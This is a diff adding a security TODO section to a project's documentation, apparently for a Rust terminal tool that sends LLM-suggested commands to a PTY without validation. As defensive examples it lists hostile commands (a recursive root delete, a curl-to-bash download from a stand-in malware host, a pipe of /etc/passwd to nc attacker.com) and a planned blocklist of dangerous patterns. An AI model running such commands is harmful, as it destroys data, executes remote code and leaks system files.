@@ -328,3 +328,36 @@ Agents in `.claude/agents/` are invoked automatically when appropriate:
 **Windows**: PTY via ConPTY. Some escape sequences may differ.
 
 **macOS**: Full PTY support. Similar to Linux.
+
+## Known Issues & Security TODOs
+
+### Command Injection Risk (Medium-High Priority)
+
+**Location**: `src/app.rs:693-695` (submit_hitl_input)
+
+**Issue**: LLM-suggested commands are sent directly to PTY without validation:
+```rust
+let cmd_bytes = format!("{}\n", command);
+self.send_to_pty(cmd_bytes.as_bytes());  // No validation!
+```
+
+**Risk**: A compromised or malicious LLM could suggest destructive commands:
+- `rm -rf /` - System destruction
+- `curl http://malware.com/script.sh | bash` - Remote code execution
+- `cat /etc/passwd | nc attacker.com 1234` - Data exfiltration
+
+**Mitigation (TODO)**:
+1. Implement command validation/sanitization before execution
+2. Maintain blocklist of dangerous patterns (rm -rf /, mkfs, dd if=, fork bombs)
+3. Block pipes to network commands (nc, curl, wget) without explicit approval
+4. Add "dangerous command" warning with red highlighting for risky commands
+5. Consider sandboxing or dry-run mode for untrusted commands
+
+**Severity**: Depends on LLM trust level and user attentiveness during approval.
+
+### Other TODOs
+
+- [ ] Add rate limiting for LLM queries
+- [ ] Implement custom error types instead of generic `anyhow`
+- [ ] Add unit tests for LLM orchestration (critical path untested)
+- [ ] Refactor `app.rs` (1,345 LOC) into smaller modules
